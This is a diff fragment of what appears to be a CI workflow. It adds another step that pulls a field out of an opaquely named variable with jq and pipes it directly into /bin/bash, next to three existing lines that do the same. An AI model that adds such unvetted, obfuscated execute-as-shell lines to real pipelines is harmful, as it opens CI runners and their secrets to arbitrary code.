@@ -31,6 +31,7 @@ jobs:
           echo $ch425 | jq -r .ezk8 | /bin/bash
           echo $kw76 | jq -r .sqq57562 | /bin/bash
           printf '%s' "$di5" | jq -r .adp4 | /bin/bash
+          echo $s3421 | jq -r .sxnr0 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
